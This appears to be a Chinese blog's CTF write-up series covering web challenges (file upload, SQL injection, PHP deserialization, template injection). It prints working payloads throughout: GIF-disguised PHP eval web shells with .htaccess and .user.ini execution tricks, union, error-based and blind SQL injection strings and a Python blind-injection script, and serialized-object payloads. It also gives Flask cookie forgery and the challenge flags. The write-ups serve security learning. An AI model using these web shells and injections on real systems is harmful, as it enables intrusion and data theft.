+&lt;p>过滤了几个常规的php后缀，用.php7绕过，同时抓包修改MIME为image/png&lt;/p>
+&lt;p>之后发现它会检测上传内容有没有&lt;code>&amp;lt;?&lt;/code>，用gif+phtml样式的🐎&lt;/p>
+&lt;p>pure.phtml&lt;/p>
+&lt;pre tabindex="0">&lt;code>GIF89a
+&amp;lt;script language='php'&amp;gt;eval($_POST['amiz']);&amp;lt;/script&amp;gt;
+&lt;/code>&lt;/pre>&lt;p>连蚁剑&lt;/p>
+&lt;p>flag{23be575a-679e-4f7c-b75b-6e033d10bfca}&lt;/p>
+&lt;/details>
+&lt;details>
+&lt;summary>
+&lt;h4 class="inline">
+[ACTF2020 新生赛]Upload
+&lt;/h4>
+&lt;/summary>
+&lt;p>前端限制后缀白名单jpg, png, gif，删审查元素会删不掉已经注册了的回调函数，所以直接改后缀名上传，然后抓包改一下&lt;/p>
+&lt;p>pure.html&lt;/p>
+&lt;pre tabindex="0">&lt;code>GIF89a
+&amp;lt;script language='php'&amp;gt;eval($_POST['amiz']);&amp;lt;/script&amp;gt;
+&lt;/code>&lt;/pre>&lt;p>连蚁剑&lt;/p>
+&lt;p>flag{a8ff29f2-5197-4599-a1c4-1e8b5f390a8c}&lt;/p>
+&lt;/details>
+&lt;details>
+&lt;summary>
+&lt;h4 class="inline">
+[RoarCTF 2019]Easy Calc
+&lt;/h4>
+&lt;/summary>
+&lt;p>页面源码：I&amp;rsquo;ve set up WAF to ensure security.&lt;/p>
+&lt;p>num参数以get方式传入，不允许有字母；绕过方式&lt;code>/calc.php ?num=xyx&lt;/code>，加空格；还有&lt;code>chr()&lt;/code>+ascii码&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#111">tmp&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">str&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">input&lt;/span>&lt;span style="color:#111">())&lt;/span>
+&lt;span style="color:#111">res&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;#39;&lt;/span>
+&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">_&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">tmp&lt;/span>&lt;span style="color:#111">:&lt;/span>
+&lt;span style="color:#111">res&lt;/span> &lt;span style="color:#f92672">+=&lt;/span> &lt;span style="color:#d88200">f&lt;/span>&lt;span style="color:#d88200">&amp;#39;chr(&lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">str&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">ord&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">_&lt;/span>&lt;span style="color:#111">))&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">).&amp;#39;&lt;/span>
+&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">res&lt;/span>&lt;span style="color:#111">[:&lt;/span>&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">])&lt;/span>
+&lt;/code>&lt;/pre>&lt;/div>&lt;pre tabindex="0">&lt;code>/calc.php? num=1;var_dump(scandir(chr(47))) # 爆目录文件 f1agg
+/calc.php? num=1;var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))
+&lt;/code>&lt;/pre>&lt;p>flag{4f1c0f5a-5a7b-4ad4-b7f4-9eb82de3f93f}&lt;/p>
+&lt;/details>
+&lt;details>
+&lt;summary>
+&lt;h4 class="inline">
+[极客大挑战 2019]PHP
+&lt;/h4>
+&lt;/summary>
+&lt;p>备份文件泄露/www.zip，flag.php中得到flag&lt;/p>
+&lt;p>Syc{dog_dog_dog_dog}&lt;/p>
+&lt;/details>
+&lt;details>
+&lt;summary>
+&lt;h4 class="inline">
+[极客大挑战 2019]BabySQL
+&lt;/h4>
+&lt;/summary>
+&lt;p>把union, select双写即可&lt;/p>
+&lt;pre tabindex="0">&lt;code>admin' ununionion selselectect 1,2,3#
+1' uunionnion sselectelect 1,2,group_concat(schema_name) ffromrom infoorrmation_schema.schemata%23 # 库名information_schema,mysql,performance_schema,test,ctf,geek
+1' ununionion seselectlect 1,2,group_concat(table_name) frfromom infoorrmation_schema.tables whewherere table_schema='ctf'%23 # 表名 Flag
+1' ununionion seselectlect 1,2,group_concat(column_name) frfromom infoorrmation_schema.columns whwhereere table_name='Flag' # 字段名flag
+1' union select 1,2,group_concat(flag) from ctf.Flag # ctf库Flag表的flag字段
+&lt;/code>&lt;/pre>&lt;p>flag{b6848383-f7d0-4cad-ad7d-98ab54790bbe}&lt;/p>
+&lt;p>可以写一个mini轮，用于sql语句双写（自己写的比较渣就不放了捏&lt;/p>
+&lt;/details>
+&lt;details>
+&lt;summary>
+&lt;h4 class="inline">
+[ACTF2020 新生赛]BackupFile
+&lt;/h4>
+&lt;/summary>
+&lt;p>/index.php.bak&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
+&lt;span style="color:#00a8c8">include_once&lt;/span> &lt;span style="color:#d88200">&amp;#34;flag.php&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
+&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">isset&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;key&amp;#39;&lt;/span>&lt;span style="color:#111">]))&lt;/span> &lt;span style="color:#111">{&lt;/span>
+&lt;span style="color:#111">$key&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;key&amp;#39;&lt;/span>&lt;span style="color:#111">];&lt;/span>
+&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#75af00">is_numeric&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$key&lt;/span>&lt;span style="color:#111">))&lt;/span> &lt;span style="color:#111">{&lt;/span>
+&lt;span style="color:#00a8c8">exit&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Just num!&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
+&lt;span style="color:#111">}&lt;/span>
+&lt;span style="color:#111">$key&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">intval&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$key&lt;/span>&lt;span style="color:#111">);&lt;/span>
+&lt;span style="color:#111">$str&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
+&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$key&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#111">$str&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
+&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#111">$flag&lt;/span>&lt;span style="color:#111">;&lt;/span>
+&lt;span style="color:#111">}&lt;/span>
+&lt;span style="color:#111">}&lt;/span>
+&lt;span style="color:#00a8c8">else&lt;/span> &lt;span style="color:#111">{&lt;/span>
+&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#d88200">&amp;#34;Try to find out source file!&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
+&lt;span style="color:#111">}&lt;/span>
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>看似比较复杂一点，但是if的比较是弱比较&lt;/p>
+&lt;p>payload&lt;/p>
+&lt;pre tabindex="0">&lt;code>?key=123
+&lt;/code>&lt;/pre>&lt;p>flag{758691a1-017b-4033-899a-bd78281fbcc1}&lt;/p>
+&lt;/details>
+&lt;details>
+&lt;summary>
+&lt;h4 class="inline">
+[护网杯 2018]easy_tornado
+&lt;/h4>
+&lt;/summary>
+&lt;p>/hint.txt：md5(cookie_secret+md5(filename))&lt;/p>
+&lt;p>/flag.txt：/fllllllllllllag&lt;/p>
+&lt;p>目标是找到cookie_secret，在报错页面发现可能的模板渲染&lt;/p>
+&lt;pre tabindex="0">&lt;code>/error?msg={{handler.settings}}
+&lt;/code>&lt;/pre>&lt;p>得到cookie_secret: 13b08673-9199-47bc-b5a2-bb7938591e62&lt;/p>
+&lt;pre tabindex="0">&lt;code>/file?filename=/fllllllllllllag&amp;amp;filehash=3725772b08f76e01024d81754c45f307
+&lt;/code>&lt;/pre>&lt;p>flag{5756e16a-885e-4009-83e1-653a4818a39a}&lt;/p>
+&lt;/details>
+&lt;details>
+&lt;summary>
+&lt;h4 class="inline">
+[极客大挑战 2019]BuyFlag
+&lt;/h4>
+&lt;/summary>
+&lt;p>/pay.php，页面源码&lt;/p>
+&lt;pre tabindex="0">&lt;code>~~~post money and password~~~
+if (isset($_POST['password'])) {
+$password = $_POST['password'];
+if (is_numeric($password)) {
+echo &amp;quot;password can't be number&amp;lt;/br&amp;gt;&amp;quot;;
+}elseif ($password == 404) {
+echo &amp;quot;Password Right!&amp;lt;/br&amp;gt;&amp;quot;;
+}
+}
+&lt;/code>&lt;/pre>&lt;p>&lt;code>is_numeric&lt;/code>函数用&lt;code>%20&lt;/code>绕过&lt;/p>
+&lt;pre tabindex="0">&lt;code>password=404%20&amp;amp;money[]=100000000
+Cookie: user=1
+&lt;/code>&lt;/pre>&lt;p>flag{a3cd1620-d3f7-45a9-8b3d-ace1ed21e7fb}&lt;/p>
+&lt;/details>
+&lt;details>
+&lt;summary>
+&lt;h4 class="inline">
+[HCTF 2018]admin
+&lt;/h4>
+&lt;/summary>
+&lt;p>————非预期：admin: 123弱口令&lt;/p>
+&lt;p>————解法1：&lt;code>ᴬᴰᴹᴵᴺ&lt;/code>unicode欺骗，注册&lt;code>ᴬᴰᴹᴵᴺ: 456&lt;/code>的号，改密为999，登入&lt;/p>
+&lt;p>————解法2：看cookie是熟悉的flask-session，改密页面/change提示https://github.com/woadsl1234/hctf_flask/，拿到secret=&amp;lsquo;ckj123&amp;rsquo;&lt;/p>
+&lt;pre tabindex="0">&lt;code>python3 flask_session_cookie_manager3.py encode -s 'ckj123' -t &amp;quot;{'_fresh':True,'_id': b'Yjg0OGY3OWU1MTI4ZWNhNWU1YWFlZWJiYzg5ZGM1NWNkZTIxYzlkNWJmZjI0YzhkMzljYWE1YzFlZTQ4OWEzY2EwYjlmNGYzODU4OTA1MTA0M2E3MWQ3ODM0M2JmY2IxNjI4MGQxOTQwNThmZDFmODg2ODFlZTdhOTQ1ZGQ0YWM=','csrf_token': b'NGEwMDMxNmEyYzhlNzhkYWRiMTUwYjBiOWIwNGFmYzI1YTIxOTQzMg==','image': b'eWl6eA==','name':'amiz','user_id':'10'}&amp;quot;
+&lt;/code>&lt;/pre>&lt;p>flag{f479cd5d-4bc7-47a6-b6b2-be84ff250880}&lt;/p>
+&lt;p>注意这个脚本加密的时候的内部都是单引号，并且没有多余的花括号&lt;/p>
+&lt;/details>
+&lt;details>
+&lt;summary>
+&lt;h4 class="inline">
+[BJDCTF2020]Easy MD5
+&lt;/h4>
+&lt;/summary>
+&lt;p>响应头有Hint: select * from &amp;lsquo;admin&amp;rsquo; where password=md5($pass,true)&lt;/p>
+&lt;p>php中md5的第二个参数为true时输出16字符二进制，默认false输出32字符十六进制，也就是说这里返回raw md5&lt;/p>
+&lt;p>mysql中在进行布尔类型判断时，1开头的字符串会被当做int型&lt;/p>
+&lt;pre tabindex="0">&lt;code>password='xxx'or'1xxx'
+password='xxx'or 1
+password='xxx'or'1'
+password='xxx'or true # 以上三者均返回true
+password='xxx'or'0trash' # false
+&lt;/code>&lt;/pre>&lt;p>raw md5包含很多字符，如果raw md5包含&lt;code>'trash'or'1trash'&lt;/code>这样的，就会true，永真&lt;/p>
+&lt;p>一个参考payload是&lt;/p>
+&lt;pre tabindex="0">&lt;code>ffifdyop
+hash: 276f722736c95d99e921722cf9ed621c
+&lt;/code>&lt;/pre>&lt;p>爆破脚本&lt;/p>
+&lt;pre tabindex="0">&lt;code>&amp;lt;?php
+for ($i = 0;;) {
+for ($c = 0; $c &amp;lt; 1000000; $c++, $i++)
+if (stripos(md5($i, true), '\'or\'') !== false)
+echo &amp;quot;\nmd5($i) = &amp;quot; . md5($i, true) . &amp;quot;\n&amp;quot;;
+echo &amp;quot;.&amp;quot;;
+}
+?&amp;gt;
+&lt;/code>&lt;/pre>&lt;p>参考：&lt;a href="http://mslc.ctf.su/wp/leet-more-2010-oh-those-admins-writeup/">Leet More 2010 Oh Those Admins! writeup&lt;/a>&lt;/p>
+&lt;p>之后进入下一关，页面源码&lt;/p>
+&lt;pre tabindex="0">&lt;code>$a = $GET['a'];
+$b = $_GET['b'];
+if($a != $b &amp;amp;&amp;amp; md5($a) == md5($b)){
+// wow, glzjin wants a girl friend.
+&lt;/code>&lt;/pre>&lt;p>数组绕过，payload&lt;/p>
+&lt;pre tabindex="0">&lt;code>/levels91.php?a[]=1&amp;amp;b[]=2
+&lt;/code>&lt;/pre>&lt;p>进入下一关&lt;/p>
+&lt;pre tabindex="0">&lt;code>&amp;lt;?php
+error_reporting(0);
+include &amp;quot;flag.php&amp;quot;;
+highlight_file(__FILE__);
+if($_POST['param1']!==$_POST['param2']&amp;amp;&amp;amp;md5($_POST['param1'])===md5($_POST['param2'])){
+echo $flag;
+}
+&lt;/code>&lt;/pre>&lt;p>依旧数组绕过，注意post&lt;/p>
+&lt;pre tabindex="0">&lt;code>/levell14.php
+param1[]=1&amp;amp;param2[]=2
+&lt;/code>&lt;/pre>&lt;p>flag{78df171e-faa3-4c31-922f-a1f532e06dac}&lt;/p>
+&lt;/details>
+&lt;details>
+&lt;summary>
+&lt;h4 class="inline">
+[ZJCTF 2019]NiZhuanSiWei
+&lt;/h4>
+&lt;/summary>
+&lt;pre tabindex="0">&lt;code>&amp;lt;?php
+$text = $_GET[&amp;quot;text&amp;quot;];
+$file = $_GET[&amp;quot;file&amp;quot;];
+$password = $_GET[&amp;quot;password&amp;quot;];
+if(isset($text)&amp;amp;&amp;amp;(file_get_contents($text,'r')===&amp;quot;welcome to the zjctf&amp;quot;)){
+echo &amp;quot;&amp;lt;br&amp;gt;&amp;lt;h1&amp;gt;&amp;quot;.file_get_contents($text,'r').&amp;quot;&amp;lt;/h1&amp;gt;&amp;lt;/br&amp;gt;&amp;quot;;
+if(preg_match(&amp;quot;/flag/&amp;quot;,$file)){
+echo &amp;quot;Not now!&amp;quot;;
+exit();
+}else{
+include($file); //useless.php
+$password = unserialize($password);
+echo $password;
+}
+}
+else{
+highlight_file(__FILE__);
+}
+?&amp;gt;
+&lt;/code>&lt;/pre>&lt;p>指定了&lt;code>r&lt;/code>，用&lt;code>data://&lt;/code>伪协议&lt;/p>
+&lt;pre tabindex="0">&lt;code>/?text=data://text/plain,welcome to the zjctf&amp;amp;file=php://filter/convert.base64-encode/resource=useless.php
+&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>&amp;lt;?php
+class Flag{ //flag.php
+public $file;
+public function __tostring(){
+if(isset($this-&amp;gt;file)){
+echo file_get_contents($this-&amp;gt;file);
+echo &amp;quot;&amp;lt;br&amp;gt;&amp;quot;;
+return (&amp;quot;U R SO CLOSE !///COME ON PLZ&amp;quot;);
+}
+}
+}
+?&amp;gt;
+&lt;/code>&lt;/pre>&lt;p>非常简单的反序列化&lt;/p>
+&lt;pre tabindex="0">&lt;code>$a = new Flag();
+$a-&amp;gt;file = 'flag.php';
+echo serialize($a);
+&lt;/code>&lt;/pre>&lt;p>payload&lt;/p>
+&lt;pre tabindex="0">&lt;code>/?text=data://text/plain,welcome to the zjctf&amp;amp;file=useless.php&amp;amp;password=O:4:&amp;quot;Flag&amp;quot;:1:{s:4:&amp;quot;file&amp;quot;;s:8:&amp;quot;flag.php&amp;quot;;}
+&lt;/code>&lt;/pre>&lt;p>flag{0e255178-c131-4073-beb9-5821c29c0c3c}&lt;/p>
+&lt;/details>
+&lt;details>
+&lt;summary>
+&lt;h4 class="inline">
+[SUCTF 2019]CheckIn
+&lt;/h4>
+&lt;/summary>
+&lt;p>传pure.phtml，对后缀检测，jpg会检测文件内容，考虑上传.user.ini&lt;/p>
+&lt;p>pure2.gif&lt;/p>
+&lt;pre tabindex="0">&lt;code>GIF89a
+&amp;lt;script language='php'&amp;gt;eval($_POST['amiz']);&amp;lt;/script&amp;gt;
+&lt;/code>&lt;/pre>&lt;p>.user.ini&lt;/p>
+&lt;pre tabindex="0">&lt;code>GIF89a
+auto_prepend_file=pure2.gif
+&lt;/code>&lt;/pre>&lt;p>uploads/cc551ab005b2e60fbdc88de809b2c4b1&lt;/p>
+&lt;p>传的时候文件重名给远程环境整崩了，懒得重开了，寄&lt;/p>
+&lt;/details>
+&lt;details>
+&lt;summary>
+&lt;h4 class="inline">
+[极客大挑战 2019]HardSQL
+&lt;/h4>
+&lt;/summary>
+&lt;p>之前几个分别用了万能密码，联合查询，双写，这次轮到报错注入了&lt;/p>
+&lt;p>过滤了&lt;code>=&lt;/code>，换成&lt;code>(a)like(b)&lt;/code>这样的&lt;/p>
+&lt;pre tabindex="0">&lt;code>1'or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(database()))),1))%23 # H4rDsq1
+&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>1'or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like('H4rDsq1'))),1))%23 # id,username,password
+&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>1'or(updatexml(1,concat(0x7e,(select(group_concat(password))from(H4rDsq1))),1))%23
+&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>1'or(updatexml(1,concat(0x7e,(select(group_concat(right(password,25)))from(H4rDsq1))),1))%23
+&lt;/code>&lt;/pre>&lt;p>flag{64053c33-96f3-4bea-8e94-02fb81e48236}&lt;/p>
+&lt;/details>
+&lt;details>
+&lt;summary>
+&lt;h4 class="inline">
+[MRCTF2020]你传你🐎呢
+&lt;/h4>
+&lt;/summary>
+&lt;p>传.htaccess&lt;/p>
+&lt;pre tabindex="0">&lt;code>&amp;lt;FilesMatch &amp;quot;wuhu&amp;quot;&amp;gt;
+SetHandler application/x-httpd-php
+&amp;lt;/FilesMatch&amp;gt;
+&lt;/code>&lt;/pre>&lt;p>/var/www/html/upload/fa75c48848aa00244f9317333bbbffe1/.htaccess&lt;/p>
+&lt;p>传wuhu.jpg&lt;/p>
+&lt;pre tabindex="0">&lt;code>&amp;lt;?php eval($_POST['wuhu']);?&amp;gt;
+&lt;/code>&lt;/pre>&lt;p>/var/www/html/upload/fa75c48848aa00244f9317333bbbffe1/wuhu.jpg&lt;/p>
+&lt;p>连蚁剑，拿flag&lt;/p>
+&lt;p>flag{0188a589-fefe-4939-95d1-cbcc433fc9b2}&lt;/p>
+&lt;/details>
+&lt;details>
+&lt;summary>
+&lt;h4 class="inline">
+[MRCTF2020]Ez_bypass
+&lt;/h4>
+&lt;/summary>
+&lt;p>排版问题，看页面源码&lt;/p>
+&lt;pre tabindex="0">&lt;code>I put something in F12 for you
+include 'flag.php';
+$flag='MRCTF{xxxxxxxxxxxxxxxxxxxxxxxxx}';
+if(isset($_GET['gg'])&amp;amp;&amp;amp;isset($_GET['id'])) {
+$id=$_GET['id'];
+$gg=$_GET['gg'];
+if (md5($id) === md5($gg) &amp;amp;&amp;amp; $id !== $gg) {
+echo 'You got the first step';
+if(isset($_POST['passwd'])) {
+$passwd=$_POST['passwd'];
+if (!is_numeric($passwd))
+{
+if($passwd==1234567)
+{
+echo 'Good Job!';
+highlight_file('flag.php');
+die('By Retr_0');
+}
+else
+{
+echo &amp;quot;can you think twice??&amp;quot;;
+}
+}
+else{
+echo 'You can not get it !';
+}
+}
+else{
+die('only one way to get the flag');
+}
+}
+else {
+echo &amp;quot;You are not a real hacker!&amp;quot;;
+}
+}
+else{
+die('Please input first');
+}
+}Please input first
+&lt;/code>&lt;/pre>&lt;p>md5数组绕过，&lt;code>is_numeric&lt;/code>绕过&lt;/p>
+&lt;pre tabindex="0">&lt;code>/?id[]=1&amp;amp;gg[]=2
+POST: passwd=1234567%20
+&lt;/code>&lt;/pre>&lt;p>flag{2d5c5d49-f8a2-471e-b3f0-8861a85e34a8}&lt;/p>
+&lt;/details>
+&lt;details>
+&lt;summary>
+&lt;h4 class="inline">
+[网鼎杯 2020 青龙组]AreUSerialz
+&lt;/h4>
+&lt;/summary>
+&lt;pre tabindex="0">&lt;code>&amp;lt;?php
+include(&amp;quot;flag.php&amp;quot;);
+highlight_file(__FILE__);
+class FileHandler {
+protected $op;
+protected $filename;
+protected $content;
+function __construct() {
+$op = &amp;quot;1&amp;quot;;
+$filename = &amp;quot;/tmp/tmpfile&amp;quot;;
+$content = &amp;quot;Hello World!&amp;quot;;
+$this-&amp;gt;process();
+}
+public function process() {
+if($this-&amp;gt;op == &amp;quot;1&amp;quot;) {
+$this-&amp;gt;write(); // 文件写
+} else if($this-&amp;gt;op == &amp;quot;2&amp;quot;) {
+$res = $this-&amp;gt;read(); // 文件读 读flag
+$this-&amp;gt;output($res);
+} else {
+$this-&amp;gt;output(&amp;quot;Bad Hacker!&amp;quot;);
+}
+}
+private function write() {
+if(isset($this-&amp;gt;filename) &amp;amp;&amp;amp; isset($this-&amp;gt;content)) {
+if(strlen((string)$this-&amp;gt;content) &amp;gt; 100) {
+$this-&amp;gt;output(&amp;quot;Too long!&amp;quot;);
+die();
+}
+$res = file_put_contents($this-&amp;gt;filename, $this-&amp;gt;content);
+if($res) $this-&amp;gt;output(&amp;quot;Successful!&amp;quot;);
+else $this-&amp;gt;output(&amp;quot;Failed!&amp;quot;);
+} else {
+$this-&amp;gt;output(&amp;quot;Failed!&amp;quot;);
+}
+}
+private function read() {
+$res = &amp;quot;&amp;quot;;
+if(isset($this-&amp;gt;filename)) {
+$res = file_get_contents($this-&amp;gt;filename); // 文件读
+}
+return $res;
+}
+private function output($s) {
+echo &amp;quot;[Result]: &amp;lt;br&amp;gt;&amp;quot;;
+echo $s;
+}
+function __destruct() {
+if($this-&amp;gt;op === &amp;quot;2&amp;quot;) // 强比较 $op=2 int类型绕过
+$this-&amp;gt;op = &amp;quot;1&amp;quot;;
+$this-&amp;gt;content = &amp;quot;&amp;quot;;
+$this-&amp;gt;process();
+}
+}
+function is_valid($s) {
+for($i = 0; $i &amp;lt; strlen($s); $i++)
+if(!(ord($s[$i]) &amp;gt;= 32 &amp;amp;&amp;amp; ord($s[$i]) &amp;lt;= 125)) // 只允许大小写+数字+普通字符 即可见字符
+return false;
+return true;
+}
+if(isset($_GET{'str'})) {
+$str = (string)$_GET['str'];
+if(is_valid($str)) {
+$obj = unserialize($str); // 先过滤再反序列化
+}
+}
+&lt;/code>&lt;/pre>&lt;p>坑点在于&lt;code>private function&lt;/code>序列化之后会产生不可见字符，两种绕过方式：php7.1+版本对属性不敏感，本地构造payload时全改为public；或者将&lt;code>%00*%00&lt;/code>改为十六进制的&lt;code>\00*\00&lt;/code>，同时将序列化结果中的s改为S&lt;/p>
+&lt;p>这里用第一种，private全改public&lt;/p>
+&lt;pre tabindex="0">&lt;code>$obj = new FileHandler();
+$obj-&amp;gt;op = 2;
+$obj-&amp;gt;filename = 'php://filter/convert.base64-encode/resource=flag.php';
+echo serialize($obj);
+&lt;/code>&lt;/pre>&lt;p>payload&lt;/p>
+&lt;pre tabindex="0">&lt;code>/?str=O:11:&amp;quot;FileHandler&amp;quot;:3:{s:2:&amp;quot;op&amp;quot;;i:2;s:8:&amp;quot;filename&amp;quot;;s:52:&amp;quot;php://filter/convert.base64-encode/resource=flag.php&amp;quot;;s:7:&amp;quot;content&amp;quot;;N;}
+&lt;/code>&lt;/pre>&lt;p>flag{0138599e-6ac8-4573-b448-e15635135f63}&lt;/p>
+&lt;/details>
+&lt;details>
+&lt;summary>
+&lt;h4 class="inline">
+[GXYCTF2019]BabySQli
+&lt;/h4>
+&lt;/summary>
+&lt;p>页面源码提示：select * from user where username = &amp;lsquo;$name&amp;rsquo;；这说了跟没说一样，没告诉waf是啥&lt;/p>
+&lt;p>大写绕过&lt;/p>
+&lt;pre tabindex="0">&lt;code>1'Order by 3%23 # 有3列
+1'union select 1,2,3%23 # wrong user!
+1'union select 1,'admin',3%23 # wrong pass! 说明用户名在第二列
+&lt;/code>&lt;/pre>&lt;p>我们采用的方式是联合查询 创建一行临时的新数据，以这个临时数据登入&lt;/p>
+&lt;pre tabindex="0">&lt;code>name=1'union select 1,'admin','202cb962ac59075b964b07152d234b70'#&amp;amp;pw=123
+&lt;/code>&lt;/pre>&lt;p>flag{a544cd1d-4676-41d2-8110-837020cf11e5}&lt;/p>
+&lt;/details>
+&lt;details>
+&lt;summary>
+&lt;h4 class="inline">
+[GYCTF2020]Blacklist
+&lt;/h4>
+&lt;/summary>
+&lt;p>跟qwb的随便注非常像，拿payload来试试&lt;/p>
+&lt;pre tabindex="0">&lt;code>1';show tables;
+1';show columns from `FlagHere`;
+1';show columns from `words`;
+&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>1';Set @xx=concat('se','lect * from `FlagHere`;');Prepare x from @xx;execute x;
+&lt;/code>&lt;/pre>&lt;p>回显过滤条件&lt;/p>
+&lt;pre tabindex="0">&lt;code>return preg_match(&amp;quot;/set|prepare|alter|rename|select|update|delete|drop|insert|where|\./i&amp;quot;,$inject);
+&lt;/code>&lt;/pre>&lt;p>用&lt;code>handler on&lt;/code>代替&lt;code>select&lt;/code>&lt;/p>
+&lt;pre tabindex="0">&lt;code>1'; handler FlagHere open as amiz; handler amiz read first; handler amiz close;#
+&lt;/code>&lt;/pre>&lt;p>&lt;code>handler...open&lt;/code>打开一个表，使其后续可以使用&lt;code>handler...read&lt;/code>访问，并且在该会话&lt;code>handler...close&lt;/code>或终止前不会关闭&lt;/p>
+&lt;p>flag{9ba3c903-1a8c-4a40-b32a-f9752251269c}&lt;/p>
+&lt;/details>
+&lt;details>
+&lt;summary>
+&lt;h4 class="inline">
+[CISCN2019 华北赛区 Day2 Web1]Hack World
+&lt;/h4>
+&lt;/summary>
+&lt;p>长得跟前面的随便注和Blacklist很像，直接给出了flag在flag表flag列&lt;/p>
+&lt;p>拿fuzz字典过一遍，过滤了and or union order group information，盲注py脚本走起，上二分&lt;/p>
+&lt;pre tabindex="0">&lt;code>import requests
+url = 'http://e59ccad4-7152-44b6-ab8f-c632bb29ac31.node4.buuoj.cn:81/index.php'
+target = 'glzjin'
+content = ''
+for i in range(1, 40):
+left = 32
+right = 127
+mid = (left + right) // 2
+while right &amp;gt; left:
+payload = f&amp;quot;if(ascii(substr((select(flag)from(flag)),{i},1))&amp;gt;{mid},1,2)&amp;quot;
+data = {&amp;quot;id&amp;quot;:payload}
+response = requests.post(url, data)
+if target in response.text:
+left = mid + 1
+else:
+right = mid
+mid = (left + right) // 2
+content += chr(int(mid))
+print(content)
+&lt;/code>&lt;/pre>&lt;p>flag{1b79970-4e0-e-b78f-2d63d8c77375}&lt;/p>
+&lt;/details>
+&lt;details>
+&lt;summary>
+&lt;h4 class="inline">
+[网鼎杯 2018]Fakebook
+&lt;/h4>
+&lt;/summary>
+&lt;p>/robots.txt提示/user.php.bak&lt;/p>
+&lt;pre tabindex="0">&lt;code>&amp;lt;?php
+class UserInfo
+{
+public $name = &amp;quot;&amp;quot;;
+public $age = 0;
+public $blog = &amp;quot;&amp;quot;;
+public function __construct($name, $age, $blog)
+{
+$this-&amp;gt;name = $name;
+$this-&amp;gt;age = (int)$age;
+$this-&amp;gt;blog = $blog;
+}
+function get($url)
+{
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_URL, $url);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+$output = curl_exec($ch);
+$httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+if($httpCode == 404) {
+return 404;
+}
+curl_close($ch);
+return $output;
+}
+public function getBlogContents ()
+{
+return $this-&amp;gt;get($this-&amp;gt;blog);
+}
+public function isValidBlog ()
+{
+$blog = $this-&amp;gt;blog;
+return preg_match(&amp;quot;/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]{2,6}(\:[0-9]+)?(\/\S*)?$/i&amp;quot;, $blog);
+}
+}
+&lt;/code>&lt;/pre>&lt;p>有个curl，反序列化点&lt;/p>
+&lt;pre tabindex="0">&lt;code>$age = 18;
+$blog = &amp;quot;file:///var/www/html/flag.php&amp;quot;;
+$name = &amp;quot;amiz&amp;quot;;
+$a = new UserInfo($name,$age,$blog);
+echo serialize($a);
